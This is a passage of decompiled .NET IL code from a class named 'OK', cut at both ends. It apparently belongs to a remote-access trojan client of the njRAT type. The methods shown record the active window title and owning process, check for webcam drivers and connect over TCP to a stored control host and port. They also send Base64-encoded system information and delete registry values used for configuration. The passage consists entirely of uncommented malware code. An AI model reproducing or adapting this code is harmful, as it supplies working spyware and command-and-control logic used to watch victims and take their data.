      IL_003d:  add.ovf
      IL_003e:  ldstr      "*"
      IL_0043:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::StrDup(int32,
                                                                                               string)
      IL_0048:  stloc.s    V_6
      IL_004a:  ldloc.3
      IL_004b:  ldloca.s   V_6
      IL_004d:  ldloc.s    V_5
      IL_004f:  ldc.i4.1
      IL_0050:  add.ovf
      IL_0051:  call       int32 ClassLibrary1.OK::GetWindowText(native int,
                                                                 string&,
                                                                 int32)
      IL_0056:  pop
      IL_0057:  ldloc.3
      IL_0058:  ldloca.s   V_4
      IL_005a:  call       int32 ClassLibrary1.OK::GetWindowThreadProcessId(native int,
                                                                            int32&)
      IL_005f:  pop
      IL_0060:  ldloc.s    V_4
      IL_0062:  ldc.i4.0
      IL_0063:  ceq
      IL_0065:  stloc.s    V_12
      IL_0067:  ldloc.s    V_12
      IL_0069:  brfalse.s  IL_0075

      IL_006b:  ldloca.s   V_6
      IL_006d:  call       string ClassLibrary1.OK::ENB(string&)
      IL_0072:  stloc.1
      IL_0073:  br.s       IL_00ba

      IL_0075:  nop
      IL_0076:  nop
      .try
      {
        IL_0077:  ldloc.s    V_4
        IL_0079:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
        IL_007e:  callvirt   instance string [System]System.Diagnostics.Process::get_MainWindowTitle()
        IL_0083:  stloc.s    V_11
        IL_0085:  ldloca.s   V_11
        IL_0087:  call       string ClassLibrary1.OK::ENB(string&)
        IL_008c:  stloc.1
        IL_008d:  leave.s    IL_00b9

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_008f:  dup
        IL_0090:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0095:  stloc.s    V_8
        IL_0097:  nop
        IL_0098:  ldloc.s    V_8
        IL_009a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_009f:  nop
        IL_00a0:  ldloc.s    V_8
        IL_00a2:  stloc.s    V_7
        IL_00a4:  ldloca.s   V_6
        IL_00a6:  call       string ClassLibrary1.OK::ENB(string&)
        IL_00ab:  stloc.1
        IL_00ac:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b1:  nop
        IL_00b2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00b7:  leave.s    IL_00b9

      }  // end handler
      IL_00b9:  nop
      IL_00ba:  nop
      IL_00bb:  leave.s    IL_00ed

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00bd:  dup
      IL_00be:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c3:  stloc.s    V_10
      IL_00c5:  nop
      IL_00c6:  ldloc.s    V_10
      IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00cd:  nop
      IL_00ce:  ldloc.s    V_10
      IL_00d0:  stloc.s    V_9
      IL_00d2:  ldstr      " "
      IL_00d7:  stloc.2
      IL_00d8:  ldloca.s   V_2
      IL_00da:  call       string ClassLibrary1.OK::ENB(string&)
      IL_00df:  stloc.1
      IL_00e0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00e5:  nop
      IL_00e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00eb:  leave.s    IL_00ed

    }  // end handler
    IL_00ed:  nop
    IL_00ee:  ldloc.1
    IL_00ef:  stloc.0
    IL_00f0:  br.s       IL_00f2

    IL_00f2:  ldloc.0
    IL_00f3:  ret
  } // end of method OK::ACT

  .method public static string  BS(uint8[]& B) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::BS

  .method public static bool  Cam() cil managed
  {
    // Code size       101 (0x65)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             string V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldc.i4.0
      IL_0003:  stloc.1
      IL_0004:  nop
      IL_0005:  ldnull
      IL_0006:  stloc.2
      IL_0007:  ldloc.1
      IL_0008:  conv.ovf.i2
      IL_0009:  ldc.i4.s   100
      IL_000b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
      IL_0010:  stloc.s    V_5
      IL_0012:  ldloca.s   V_5
      IL_0014:  ldc.i4.s   100
      IL_0016:  ldloca.s   V_2
      IL_0018:  ldc.i4.s   100
      IL_001a:  call       bool ClassLibrary1.OK::capGetDriverDescriptionA(int16,
                                                                           string&,
                                                                           int32,
                                                                           string&,
                                                                           int32)
      IL_001f:  stloc.s    V_6
      IL_0021:  ldloc.s    V_6
      IL_0023:  brfalse.s  IL_0029

      IL_0025:  ldc.i4.1
      IL_0026:  stloc.0
      IL_0027:  leave.s    IL_0063

      IL_0029:  nop
      IL_002a:  ldloc.1
      IL_002b:  ldc.i4.1
      IL_002c:  add.ovf
      IL_002d:  stloc.1
      IL_002e:  ldloc.1
      IL_002f:  ldc.i4.4
      IL_0030:  cgt
      IL_0032:  ldc.i4.0
      IL_0033:  ceq
      IL_0035:  stloc.s    V_6
      IL_0037:  ldloc.s    V_6
      IL_0039:  brtrue.s   IL_0005

      IL_003b:  leave.s    IL_005e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_003d:  dup
      IL_003e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0043:  stloc.s    V_4
      IL_0045:  nop
      IL_0046:  ldloc.s    V_4
      IL_0048:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_004d:  nop
      IL_004e:  ldloc.s    V_4
      IL_0050:  stloc.3
      IL_0051:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0056:  nop
      IL_0057:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005c:  leave.s    IL_005e

    }  // end handler
    IL_005e:  nop
    IL_005f:  ldc.i4.0
    IL_0060:  stloc.0
    IL_0061:  br.s       IL_0063

    IL_0063:  ldloc.0
    IL_0064:  ret
  } // end of method OK::Cam

  .method public static pinvokeimpl("avicap32.dll" nomangle ansi lasterr winapi) 
          bool  capGetDriverDescriptionA(int16 wDriver,
                                         string&  marshal( byvalstr) lpszName,
                                         int32 cbName,
                                         string&  marshal( byvalstr) lpszVer,
                                         int32 cbVer) cil managed preservesig
  {
  }
  .method private static bool  CompDir(class [mscorlib]System.IO.FileInfo F1,
                                       class [mscorlib]System.IO.FileInfo F2) cil managed
  {
    // Code size       157 (0x9d)
    .maxstack  3
    .locals init (bool V_0,
             class [mscorlib]System.IO.DirectoryInfo V_1,
             class [mscorlib]System.IO.DirectoryInfo V_2,
             bool V_3)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0007:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_000c:  ldarg.1
    IL_000d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_0012:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0017:  ldc.i4.0
    IL_0018:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_001d:  ldc.i4.0
    IL_001e:  ceq
    IL_0020:  stloc.3
    IL_0021:  ldloc.3
    IL_0022:  brfalse.s  IL_0096

    IL_0024:  ldarg.0
    IL_0025:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_002a:  stloc.1
    IL_002b:  ldarg.1
    IL_002c:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_0031:  stloc.2
    IL_0032:  nop
    IL_0033:  ldloc.1
    IL_0034:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0039:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_003e:  ldloc.2
    IL_003f:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0044:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0049:  ldc.i4.0
    IL_004a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_004f:  ldc.i4.0
    IL_0050:  ceq
    IL_0052:  ldc.i4.0
    IL_0053:  ceq
    IL_0055:  stloc.3
    IL_0056:  ldloc.3
    IL_0057:  brfalse.s  IL_005d

    IL_0059:  ldc.i4.0
    IL_005a:  stloc.0
    IL_005b:  br.s       IL_009b

    IL_005d:  nop
    IL_005e:  ldloc.1
    IL_005f:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_0064:  stloc.1
    IL_0065:  ldloc.2
    IL_0066:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DirectoryInfo::get_Parent()
    IL_006b:  stloc.2
    IL_006c:  ldloc.1
    IL_006d:  ldnull
    IL_006e:  ceq
    IL_0070:  ldloc.2
    IL_0071:  ldnull
    IL_0072:  ceq
    IL_0074:  and
    IL_0075:  stloc.3
    IL_0076:  ldloc.3
    IL_0077:  brfalse.s  IL_007d

    IL_0079:  ldc.i4.1
    IL_007a:  stloc.0
    IL_007b:  br.s       IL_009b

    IL_007d:  nop
    IL_007e:  ldloc.1
    IL_007f:  ldnull
    IL_0080:  ceq
    IL_0082:  stloc.3
    IL_0083:  ldloc.3
    IL_0084:  brfalse.s  IL_008a

    IL_0086:  ldc.i4.0
    IL_0087:  stloc.0
    IL_0088:  br.s       IL_009b

    IL_008a:  nop
    IL_008b:  ldloc.2
    IL_008c:  ldnull
    IL_008d:  ceq
    IL_008f:  ldc.i4.0
    IL_0090:  ceq
    IL_0092:  stloc.3
    IL_0093:  ldloc.3
    IL_0094:  brtrue.s   IL_0033

    IL_0096:  nop
    IL_0097:  ldc.i4.0
    IL_0098:  stloc.0
    IL_0099:  br.s       IL_009b

    IL_009b:  ldloc.0
    IL_009c:  ret
  } // end of method OK::CompDir

  .method public static bool  connect() cil managed
  {
    // Code size       477 (0x1dd)
    .maxstack  3
    .locals init (bool V_0,
             bool V_1,
             class [mscorlib]System.IO.FileInfo V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10,
             class [mscorlib]System.Exception V_11,
             class [mscorlib]System.Exception V_12,
             class [mscorlib]System.Exception V_13,
             class [mscorlib]System.Exception V_14,
             class [mscorlib]System.IO.FileInfo V_15,
             bool V_16)
    IL_0000:  nop
    IL_0001:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
    IL_0006:  stloc.2
    IL_0007:  nop
    IL_0008:  ldloc.2
    IL_0009:  stloc.s    V_15
    IL_000b:  ldloc.s    V_15
    IL_000d:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_0012:  nop
    IL_0013:  nop
    .try
    {
      IL_0014:  nop
      .try
      {
        IL_0015:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_001a:  ldnull
        IL_001b:  ceq
        IL_001d:  ldc.i4.0
        IL_001e:  ceq
        IL_0020:  stloc.s    V_16
        IL_0022:  ldloc.s    V_16
        IL_0024:  brfalse.s  IL_0093

        IL_0026:  nop
        .try
        {
          IL_0027:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_002c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
          IL_0031:  ldc.i4.0
          IL_0032:  callvirt   instance void [System]System.Net.Sockets.Socket::Disconnect(bool)
          IL_0037:  nop
          IL_0038:  leave.s    IL_005b

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_003a:  dup
          IL_003b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0040:  stloc.s    V_4
          IL_0042:  nop
          IL_0043:  ldloc.s    V_4
          IL_0045:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_004a:  nop
          IL_004b:  ldloc.s    V_4
          IL_004d:  stloc.3
          IL_004e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0053:  nop
          IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0059:  leave.s    IL_005b

        }  // end handler
        IL_005b:  nop
        IL_005c:  nop
        .try
        {
          IL_005d:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_0062:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
          IL_0067:  nop
          IL_0068:  ldnull
          IL_0069:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
          IL_006e:  leave.s    IL_0092

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_0070:  dup
          IL_0071:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0076:  stloc.s    V_6
          IL_0078:  nop
          IL_0079:  ldloc.s    V_6
          IL_007b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0080:  nop
          IL_0081:  ldloc.s    V_6
          IL_0083:  stloc.s    V_5
          IL_0085:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_008a:  nop
          IL_008b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0090:  leave.s    IL_0092

        }  // end handler
        IL_0092:  nop
        IL_0093:  nop
        IL_0094:  nop
        .try
        {
          IL_0095:  ldsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
          IL_009a:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
          IL_009f:  nop
          IL_00a0:  leave.s    IL_00c4

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_00a2:  dup
          IL_00a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00a8:  stloc.s    V_8
          IL_00aa:  nop
          IL_00ab:  ldloc.s    V_8
          IL_00ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00b2:  nop
          IL_00b3:  ldloc.s    V_8
          IL_00b5:  stloc.s    V_7
          IL_00b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00bc:  nop
          IL_00bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_00c2:  leave.s    IL_00c4

        }  // end handler
        IL_00c4:  nop
        IL_00c5:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_00ca:  stsfld     class [mscorlib]System.IO.MemoryStream ClassLibrary1.OK::MeM
        IL_00cf:  nop
        .try
        {
          IL_00d0:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_00d5:  ldnull
          IL_00d6:  ceq
          IL_00d8:  ldc.i4.0
          IL_00d9:  ceq
          IL_00db:  stloc.s    V_16
          IL_00dd:  ldloc.s    V_16
          IL_00df:  brfalse.s  IL_00f2

          IL_00e1:  ldsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_00e6:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
          IL_00eb:  nop
          IL_00ec:  ldnull
          IL_00ed:  stsfld     class [System]System.Diagnostics.Process ClassLibrary1.OK::Pro
          IL_00f2:  nop
          IL_00f3:  leave.s    IL_0117

        }  // end .try
        catch [mscorlib]System.Exception 
        {
          IL_00f5:  dup
          IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_00fb:  stloc.s    V_10
          IL_00fd:  nop
          IL_00fe:  ldloc.s    V_10
          IL_0100:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
          IL_0105:  nop
          IL_0106:  ldloc.s    V_10
          IL_0108:  stloc.s    V_9
          IL_010a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_010f:  nop
          IL_0110:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
          IL_0115:  leave.s    IL_0117

        }  // end handler
        IL_0117:  nop
        IL_0118:  leave.s    IL_013c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_011a:  dup
        IL_011b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0120:  stloc.s    V_11
        IL_0122:  nop
        IL_0123:  ldloc.s    V_11
        IL_0125:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_012a:  nop
        IL_012b:  ldloc.s    V_11
        IL_012d:  stloc.s    V_12
        IL_012f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0134:  nop
        IL_0135:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_013a:  leave.s    IL_013c

      }  // end handler
      IL_013c:  nop
      IL_013d:  nop
      .try
      {
        IL_013e:  newobj     instance void [System]System.Net.Sockets.TcpClient::.ctor()
        IL_0143:  stsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_0148:  ldc.i4     0x3e8
        IL_014d:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0152:  nop
        IL_0153:  ldsfld     class [System]System.Net.Sockets.TcpClient ClassLibrary1.OK::C
        IL_0158:  ldsfld     string ClassLibrary1.OK::H
        IL_015d:  ldsfld     string ClassLibrary1.OK::P
        IL_0162:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
        IL_0167:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Connect(string,
                                                                                         int32)
        IL_016c:  nop
        IL_016d:  ldc.i4.1
        IL_016e:  stsfld     bool ClassLibrary1.OK::Cn
        IL_0173:  call       string ClassLibrary1.OK::inf()
        IL_0178:  call       bool ClassLibrary1.OK::Send(string)
        IL_017d:  pop
        IL_017e:  ldsfld     bool ClassLibrary1.OK::Cn
        IL_0183:  ldc.i4.0
        IL_0184:  ceq
        IL_0186:  stloc.s    V_16
        IL_0188:  ldloc.s    V_16
        IL_018a:  brfalse.s  IL_0190

        IL_018c:  ldc.i4.0
        IL_018d:  stloc.0
        IL_018e:  leave.s    IL_01db

        IL_0190:  nop
        IL_0191:  ldc.i4.1
        IL_0192:  stloc.0
        IL_0193:  leave.s    IL_01db

        IL_0195:  leave.s    IL_01ca

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0197:  dup
        IL_0198:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_019d:  stloc.s    V_13
        IL_019f:  nop
        IL_01a0:  ldloc.s    V_13
        IL_01a2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_01a7:  nop
        IL_01a8:  ldloc.s    V_13
        IL_01aa:  stloc.s    V_14
        IL_01ac:  ldc.i4.0
        IL_01ad:  stsfld     bool ClassLibrary1.OK::Cn
        IL_01b2:  ldc.i4.0
        IL_01b3:  stloc.1
        IL_01b4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01b9:  nop
        IL_01ba:  ldloc.1
        IL_01bb:  stloc.0
        IL_01bc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01c1:  leave.s    IL_01db

        IL_01c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_01c8:  leave.s    IL_01ca

      }  // end handler
      IL_01ca:  nop
      IL_01cb:  nop
      IL_01cc:  leave.s    IL_01d7

    }  // end .try
    finally
    {
      IL_01ce:  ldloc.s    V_15
      IL_01d0:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_01d5:  nop
      IL_01d6:  endfinally
    }  // end handler
    IL_01d7:  ldloc.1
    IL_01d8:  stloc.0
    IL_01d9:  br.s       IL_01db

    IL_01db:  ldloc.0
    IL_01dc:  ret
  } // end of method OK::connect

  .method public static string  DEB(string& s) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  2
    .locals init (uint8[] V_0,
             string V_1)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldind.ref
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  stloc.0
    IL_0009:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_000e:  ldloc.0
    IL_000f:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_0014:  stloc.1
    IL_0015:  br.s       IL_0017

    IL_0017:  ldloc.1
    IL_0018:  ret
  } // end of method OK::DEB

  .method public static void  DLV(string n) cil managed
  {
    // Code size       80 (0x50)
    .maxstack  3
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer ClassLibrary1.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string ClassLibrary1.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  ldc.i4.1
      IL_0021:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_0026:  ldarg.0
      IL_0027:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string)
      IL_002c:  nop
      IL_002d:  leave.s    IL_004d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_002f:  dup
      IL_0030:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0035:  stloc.1
      IL_0036:  nop
      IL_0037:  ldloc.1
      IL_0038:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003d:  nop
      IL_003e:  ldloc.1
      IL_003f:  stloc.0
      IL_0040:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0045:  nop
      IL_0046:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_004b:  leave.s    IL_004d

    }  // end handler
    IL_004d:  nop
    IL_004e:  nop
    IL_004f:  ret
  } // end of method OK::DLV

  .method public static void  ED() cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void ClassLibrary1.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  nop
    IL_0009:  ret
  } // end of method OK::ED

  .method public static pinvokeimpl("psapi" winapi) 
          bool  EmptyWorkingSet(int64 hProcess) cil managed preservesig
  {
  }
  .method public static string  ENB(string& s) cil managed
  {
    // Code size       23 (0x17)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0012:  stloc.0
    IL_0013:  br.s       IL_0015

    IL_0015:  ldloc.0
    IL_0016:  ret
  } // end of method OK::ENB

  .method private static void  ex() cil managed
  {
    // Code size       48 (0x30)
    .maxstack  2
    .locals init (class [mscorlib]System.Exception V_0,
             class [mscorlib]System.Exception V_1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldstr      "rsc"
      IL_0007:  call       bool ClassLibrary1.OK::Send(string)
      IL_000c:  pop
      IL_000d:  leave.s    IL_002d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000f:  dup
      IL_0010:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0015:  stloc.1
      IL_0016:  nop
      IL_0017:  ldloc.1
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  nop
      IL_001e:  ldloc.1
      IL_001f:  stloc.0
      IL_0020:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0025:  nop
      IL_0026:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002b:  leave.s    IL_002d

    }  // end handler
    IL_002d:  nop
    IL_002e:  nop
    IL_002f:  ret
  } // end of method OK::ex

  .method public static string  FR() cil managed
  {
    // Code size       72 (0x48)
    .maxstack  2
    .locals init (string V_0,
             string V_1,
             class [mscorlib]System.Exception V_2,
             class [mscorlib]System.Exception V_3,
             valuetype [mscorlib]System.DateTime V_4)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [mscorlib]System.IO.FileInfo ClassLibrary1.OK::LO
      IL_0007:  callvirt   instance valuetype [mscorlib]System.DateTime [mscorlib]System.IO.FileSystemInfo::get_LastWriteTime()
      IL_000c:  stloc.s    V_4
      IL_000e:  ldloca.s   V_4
      IL_0010:  ldstr      "yyyy-MM-dd"
      IL_0015:  call       instance string [mscorlib]System.DateTime::ToString(string)
      IL_001a:  stloc.1
      IL_001b:  leave.s    IL_0041

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_001d:  dup
      IL_001e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0023:  stloc.3
      IL_0024:  nop
      IL_0025:  ldloc.3
      IL_0026:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_002b:  nop
      IL_002c:  ldloc.3
      IL_002d:  stloc.2
      IL_002e:  ldstr      "unknown"
      IL_0033:  stloc.1
      IL_0034:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0039:  nop
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003f:  leave.s    IL_0041

    }  // end handler
    IL_0041:  nop
    IL_0042:  ldloc.1
    IL_0043:  stloc.0
    IL_0044:  br.s       IL_0046

    IL_0046:  ldloc.0
    IL_0047:  ret
  } // end of method OK::FR

  .method public static class [mscorlib]System.Array 
          fx(uint8[] b,
             string spl) cil managed
  {
